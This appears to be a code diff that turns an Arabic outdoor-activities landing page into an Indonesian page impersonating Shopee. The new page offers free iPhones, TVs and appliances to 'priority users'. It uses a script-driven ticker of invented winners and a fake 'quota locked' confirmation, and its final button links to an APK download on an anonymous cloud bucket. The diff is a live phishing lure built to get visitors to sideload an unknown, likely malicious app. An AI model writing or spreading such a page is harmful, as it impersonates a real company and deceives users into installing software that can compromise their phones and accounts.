@@ -1,121 +1,377 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رحلة المغامرة</title>
-
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '909673501935607');
-    fbq('track', 'PageView');
-    </script>
-    <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=909673501935607&ev=PageView&noscript=1"
-    /></noscript>
+    <title>Shopee Indonesia - Klaim Kuota Pengguna Prioritas</title>
     <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #0b0f1a;
-      color: white;
-      text-align: center;
-    }
-    .container { padding: 30px 20px; }
-    .title { font-size: 26px; color: #ff7a00; }
-    .subtitle { color: #ccc; margin-bottom: 30px; }
-    .icons { display: flex; justify-content: space-around; }
-    .circle {
-      width: 60px; height: 60px;
-      border: 2px solid #ff7a00;
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      margin: auto; color: #ff7a00;
-    }
-    .middle { margin: 30px 0; }
-    .highlight { color: #ff7a00; margin-top: 20px; }
-    .desc { color: #aaa; }
-    .btn {
-      display: block;
-      margin: 40px auto;
-      width: 90%; max-width: 400px;
-      background: linear-gradient(90deg, #00c36f, #00e091);
-      padding: 15px;
-      border-radius: 30px;
-      text-decoration: none;
-      color: white;
-      font-size: 18px;
-      font-weight: bold;
-      cursor: pointer;
-      border: none;
-    }
+        :root {
+            --shopee-orange: #ee4d2d;
+            --shopee-dark-orange: #ff5722;
+            --bg-gray: #f5f5f5;
+            --text-dark: #333;
+            --success-green: #2ecc71;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: var(--bg-gray);
+            margin: 0;
+            padding: 0;
+            color: var(--text-dark);
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            background: #fff;
+            min-height: 100vh;
+            box-shadow: 0 0 20px rgba(0,0,0,0.08);
+            padding-bottom: 40px;
+        }
+
+        /* 顶部动态滚动通知 */
+        .ticker-wrap {
+            background-color: #fff8e1;
+            color: #d84315;
+            font-size: 12px;
+            padding: 8px 10px;
+            overflow: hidden;
+            white-space: nowrap;
+            border-bottom: 1px solid #ffe082;
+        }
+
+        .ticker {
+            display: inline-block;
+            animation: marquee 15s linear infinite;
+        }
+
+        @keyframes marquee {
+            0% { transform: translate3d(100%, 0, 0); }
+            100% { transform: translate3d(-100%, 0, 0); }
+        }
+
+        /* 头部大促 Banner */
+        .hero-banner {
+            background: linear-gradient(135deg, var(--shopee-orange), var(--shopee-dark-orange));
+            color: #fff;
+            text-align: center;
+            padding: 35px 20px;
+            border-bottom-left-radius: 25px;
+            border-bottom-right-radius: 25px;
+        }
+
+        .hero-banner h1 {
+            margin: 0 0 8px 0;
+            font-size: 24px;
+            font-weight: 900;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .hero-banner p {
+            margin: 0 0 12px 0;
+            font-size: 13px;
+            opacity: 0.95;
+            line-height: 1.4;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            border: 1px solid rgba(255,255,255,0.4);
+        }
+
+        /* 产品列表区域样式优化 */
+        .section-title {
+            padding: 20px 15px 5px 15px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #222;
+            display: flex;
+            align-items: center;
+        }
+
+        .section-title::before {
+            content: "";
+            display: inline-block;
+            width: 4px;
+            height: 16px;
+            background-color: var(--shopee-orange);
+            margin-right: 8px;
+            border-radius: 2px;
+        }
+
+        .product-list {
+            padding: 10px 15px;
+        }
+
+        .product-item {
+            display: flex;
+            align-items: center;
+            background: #fff;
+            border: 1px solid #eaeaea;
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.02);
+        }
+
+        .product-icon {
+            font-size: 32px;
+            width: 55px;
+            height: 55px;
+            background: #fff5f3;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+
+        .product-info {
+            flex-grow: 1;
+        }
+
+        .product-name {
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .product-status {
+            font-size: 11px;
+            color: var(--shopee-orange);
+            font-weight: bold;
+            background: #fff5f3;
+            display: inline-block;
+            padding: 2px 6px;
+            border-radius: 4px;
+            border: 1px solid #ffe4de;
+        }
+
+        .btn-claim {
+            background-color: var(--shopee-orange);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            font-size: 13px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(238, 77, 45, 0.2);
+            flex-shrink: 0;
+        }
+
+        .btn-claim:active {
+            background-color: #d73d1d;
+        }
+
+        /* 弹窗样式设计 */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .modal-content {
+            background: #fff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 16px;
+            padding: 25px 20px;
+            text-align: center;
+            box-sizing: border-box;
+            animation: popUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popUp {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .success-icon {
+            font-size: 40px;
+            color: var(--success-green);
+            margin-bottom: 10px;
+        }
+
+        .modal-content h3 {
+            margin: 0 0 10px 0;
+            color: #222;
+            font-size: 18px;
+        }
+
+        .selected-badge {
+            background-color: #f9f9f9;
+            border: 1px dashed #ddd;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            color: var(--shopee-orange);
+            border-radius: 8px;
+            margin: 12px 0;
+        }
+
+        .modal-text {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        /* 最终定向跳转按钮 */
+        .btn-redirect {
+            display: block;
+            background: linear-gradient(135deg, var(--shopee-orange), #ff3d00);
+            color: white;
+            text-decoration: none;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(238, 77, 45, 0.3);
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 11px;
+            color: #bbb;
+            margin-top: 25px;
+        }
     </style>
-
-    <script>
-    function goWhatsApp() {
-      // 1. 触发 Meta "联系" (Contact) 事件
-      // 这是您销量目标中对应的联系动作
-      if (typeof fbq === 'function') {
-          fbq('track', 'Contact');
-          console.log('FB Contact Event Tracked');
-      }
-
-      // 2. 延迟 500 毫秒后再执行跳转
-      // 关键：如果没有这个延迟，浏览器会直接掐断未发完的 FB 请求
-      setTimeout(function() {
-        window.location.href = "https://api.whatsapp.com/send/?phone=447846495830&text=I want to know about party activities.";
-      }, 500); 
-    }
-    </script>
-
 </head>
-
 <body>
 
 <div class="container">
-
-  <div class="title">انطلق في رحلة المغامرة</div>
-  <div class="subtitle">تعرف على أصدقاء جدد في الأنشطة الخارجية</div>
-
-  <div class="icons">
-    <div>
-      <div class="circle">🏖</div>
-      <div>رحلات بحرية</div>
+    <!-- 1. 顶部滚动轮播 -->
+    <div class="ticker-wrap">
+        <div class="ticker" id="tickerText">
+            Sistem: Pengguna ID_***821 berhasil klaim iPhone... &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sistem: ID_***043 berhasil mengaktifkan kuota Smart TV...
+        </div>
     </div>
-    <div>
-      <div class="circle">🏊</div>
-      <div>أنشطة مائية</div>
+
+    <!-- 2. 头部横幅 -->
+    <div class="hero-banner">
+        <h1>ALOKASI KUOTA HADIAH</h1>
+        <p>Paket kuota untuk Pengguna Prioritas telah disiapkan. Pilih salah satu produk premium di bawah ini untuk mengaktifkan hak klaim Anda.</p>
+        <div class="status-badge">🟢 Status: 100% Available / Tersedia</div>
     </div>
-    <div>
-      <div class="circle">⛰</div>
-      <div>تسلق الجبال</div>
+
+    <!-- 3. 产品展示列表 (包含印尼语产品介绍) -->
+    <div class="section-title">Daftar Produk Premium Eksklusif</div>
+    <div class="product-list">
+        
+        <!-- 产品 1 -->
+        <div class="product-item">
+            <div class="product-icon">📱</div>
+            <div class="product-info">
+                <div class="product-name">iPhone 17 Pro Max</div>
+                <div class="product-status">Tersisa 2 Unit</div>
+            </div>
+            <button class="btn-claim" onclick="openClaimModal('iPhone 17 Pro Max')">Klaim</button>
+        </div>
+
+        <!-- 产品 2 -->
+        <div class="product-item">
+            <div class="product-icon">🤖</div>
+            <div class="product-info">
+                <div class="product-name">Samsung Galaxy S24 Ultra</div>
+                <div class="product-status">Tersisa 3 Unit</div>
+            </div>
+            <button class="btn-claim" onclick="openClaimModal('Samsung Galaxy S24 Ultra')">Klaim</button>
+        </div>
+
+        <!-- 产品 3 -->
+        <div class="product-item">
+            <div class="product-icon">📺</div>
+            <div class="product-info">
+                <div class="product-name">55-inch Smart TV 4K</div>
+                <div class="product-status">Tersisa 5 Unit</div>
+            </div>
+            <button class="btn-claim" onclick="openClaimModal('55-inch Smart TV 4K')">Klaim</button>
+        </div>
+
+        <!-- 产品 4 -->
+        <div class="product-item">
+            <div class="product-icon">❄️</div>
+            <div class="product-info">
+                <div class="product-name">Energy-saving Inverter AC</div>
+                <div class="product-status">Tersisa 4 Unit</div>
+            </div>
+            <button class="btn-claim" onclick="openClaimModal('Energy-saving Inverter AC')">Klaim</button>
+        </div>
+
+        <!-- 产品 5 -->
+        <div class="product-item">
+            <div class="product-icon">🧺</div>
+            <div class="product-info">
+                <div class="product-name">Automatic Washing Machine</div>
+                <div class="product-status">Tersisa 6 Unit</div>
+            </div>
+            <button class="btn-claim" onclick="openClaimModal('Automatic Washing Machine')">Klaim</button>
+        </div>
+
     </div>
-    <div>
-      <div class="circle">🔥</div>
-      <div>سهرات</div>
+
+    <div class="footer-text">
+        🔒 Sistem Keamanan Terenkripsi & Terverifikasi Shopee ID
     </div>
-  </div>
-
-  <div class="middle">
-    <div class="circle">🏕</div>
-    <div>تخييم صحراوي</div>
-  </div>
-
-  <div class="highlight">مغامرات لا تُنسى — أصدقاء جدد — ذكريات رائعة</div>
-  <div class="desc">انضم إلى مجتمع عشاق الطبيعة</div>
-
-  <button onclick="goWhatsApp()" class="btn">
-    انضم إلى WhatsApp الآن
-  </button>
-
 </div>
+
+<!-- 4. 专属资格确认弹窗 -->
+<div class="modal-overlay" id="claimModal">
+    <div class="modal-content">
+        <div class="success-icon">✅</div>
+        <h3>KUOTA BERHASIL DIKUNCI!</h3>
+        
+        <div class="selected-badge" id="selectedProductName">Nama Produk</div>
+        
+        <div class="modal-text">
+            Selamat! Kualifikasi perangkat Anda valid. Hak akses untuk produk ini telah berhasil diamankan. Silakan klik tombol di bawah ini untuk membuka halaman pengambilan resmi.
+        </div>
+        
+        <!-- 🔗 定向跳转链接：请在此处将 href 替换为您的实际目标跳转网址 -->
+        <a href="https://so8x6fuxa0x.s3.ap-east-1.amazonaws.com/4gm6omq92m69c67v4.apk">
+            AMBIL SEKARANG JUGA
+        </a>
+    </div>
+</div>
+
+<script>
+    // 弹窗控制逻辑
+    function openClaimModal(productName) {
+        // 更新弹窗中的产品名称
+        document.getElementById('selectedProductName').innerText = "Produk: " + productName;
+        // 显示弹窗
+        document.getElementById('claimModal').style.display = 'flex';
+    }
+
+    // 模拟真人动态滚动信息
+    const users = ["Rian", "Siti", "Budi", "Dewi", "Agus", "Mega", "Dedi", "Fitri"];
+    const items = ["iPhone 17 Pro Max", "Samsung S24 Ultra", "Smart TV", "Inverter AC", "Washing Machine"];
+    setInterval(() => {
+        const randomUser = users[Math.floor(Math.random() * users.length)];
+        const randomItem = items[Math.floor(Math.random() * items.length)];
+        const randomID = Math.floor(100 + Math.random() * 900);
+        document.getElementById('tickerText').innerHTML = `Sistem: Pengguna ${randomUser}_***${randomID} berhasil klaim ${randomItem}... &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sistem: ID_***${randomID} sukses mengamankan kuota...`;
+    }, 4000);
+</script>
 
 </body>
 </html>
